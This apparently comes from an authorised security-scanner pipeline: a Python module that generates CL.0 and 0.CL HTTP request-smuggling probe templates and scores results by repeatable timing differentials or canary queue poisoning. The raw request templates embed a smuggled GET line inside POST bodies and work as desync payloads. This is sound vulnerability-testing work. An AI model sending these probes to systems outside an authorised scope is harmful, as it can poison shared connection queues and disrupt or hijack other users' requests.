"""W1-001 CL.0 / 0.CL parser-discrepancy request-desync probe battery.

Planner generates the FE x BE body-semantics matrix as raw-request
templates; the oracle is strictly timing-differential (repeatable delay)
or queue poisoning of a canary path — never a single slow response.

PROPOSE-ONLY: templates only. The pipeline authorizes raw-socket use
through propose_test() -> TestAuthorization -> Engine.execute().
"""
from __future__ import annotations

from typing import Dict, List

from .common import base_case, median, surface_paths, verdict

CARD = "W1-001"
SMUGGLED_LINE = "GET {canary_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"


def desync_battery(surface: dict) -> List[Dict]:
    """Build CL.0 / 0.CL probe cases for each in-scope path.

    surface: {"kind": "http", "name": str, "host": str,
              "paths": [str], "tls": bool}
    """
    host = surface.get("host", "target")
    paths = surface_paths(surface)
    canary = "DH-DESYNC-" + surface.get("name", "t").replace(" ", "")[:12].upper()
    cases: List[Dict] = []
    for path in paths[:3]:
        cases.append(base_case(
            f"DESYNC-CL0-001::{path}", "desync", CARD, "send_raw",
            canary,
            ("Follow-up request receives the response for the smuggled "
             f"{canary} request, or a timing delay equal to its processing "
             "time — proving FE honored Content-Length while BE ignored it."),
            "Both processors agree: response belongs to the benign "
            "follow-up request with no delay differential.",
            request_template=(
                f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                "Content-Length: {cl}\r\n\r\n"
                + SMUGGLED_LINE.format(canary_path="/{canary}",
                                       host=host) + "{pad}"),
            matrix_cell="FE=CL x BE=none (CL.0)",
            repeats=3, followup="GET {canary_path} on same connection",
            control="identical POST with Content-Length: 0 and no body"))
        cases.append(base_case(
            f"DESYNC-0CL-001::{path}", "desync", CARD, "send_raw",
            canary,
            ("Smuggled request executes despite FE ignoring Content-Length "
             "— proving BE consumed CL bytes from the next request "
             "(early-response gadget required to break the deadlock)."),
            "BE never consumes the smuggled bytes; follow-up response is "
            "the benign one with no timing differential.",
            request_template=(
                f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                "Content-Length: 0\r\n\r\n"
                + SMUGGLED_LINE.format(canary_path="/{canary}",
                                       host=host) + "{pad}"),
            matrix_cell="FE=none x BE=CL (0.CL)",
            repeats=3,
            early_response_gadget="use a static/gadget path for the smuggled "
                                  "request to resolve the 0.CL deadlock",
            control="identical request without the smuggled line"))
    return cases


def score_desync(case: dict, observation: dict) -> Dict:
    """Score a desync probe observation.

    observation: {"probe_latencies": [...], "control_latencies": [...],
                  "followup_response": str, "repeats": int}
    Oracle (card false-positive rules): a single slow response is NOT
    desync — require a repeatable timing differential or canary queue
    poisoning.
    """
    signals: List[str] = []
    canary = case.get("canary", "")
    followup = observation.get("followup_response", "") or ""
    probes = list(observation.get("probe_latencies") or [])
    controls = list(observation.get("control_latencies") or [])
    repeats = int(observation.get("repeats", len(probes)))
    delay_threshold = float(observation.get("delay_threshold_s", 1.0))

    poisoned = bool(canary) and canary in followup
    if poisoned:
        signals.append("queue_poisoning:canary_in_followup_response")

    diff = 0.0
    repeated = repeats >= 3 and len(probes) >= 3
    control_clean = True
    if repeated and controls:
        diff = median(probes) - median(controls)
        control_clean = median(controls) < delay_threshold
        signals.append(f"timing_differential_s:{diff:.2f}")
        if not control_clean:
            signals.append("control_dirty:network_noise_or_shared_conn")

    if poisoned:
        return verdict("vulnerable", 0.92, signals, {
            "queue_poisoning_observed": True,
            "timing_differential_repeated": diff >= delay_threshold,
            "control_clean": control_clean,
        })
    if repeated and diff >= delay_threshold and control_clean:
        return verdict("vulnerable", 0.78, signals + ["differential_repeated"], {
            "queue_poisoning_observed": False,
            "timing_differential_repeated": True,
            "control_clean": True,
        })
    if repeated and diff >= delay_threshold and not control_clean:
        # Differential exists but the baseline is dirty (shared-connection
        # noise, network jitter): ambiguous, not a finding.
        return verdict("inconclusive", 0.4,
                       signals + ["controls_also_slow"], {
                           "queue_poisoning_observed": False,
                           "timing_differential_repeated": False,
                           "control_clean": False,
                       })
    if not repeated:
        return verdict("inconclusive", 0.3, signals + ["insufficient_repeats"], {
            "queue_poisoning_observed": False,
            "timing_differential_repeated": False,
            "control_clean": control_clean,
        })
    return verdict("not_vulnerable", 0.7, signals + ["no_differential"], {
        "queue_poisoning_observed": False,
        "timing_differential_repeated": False,
        "control_clean": control_clean,
    })
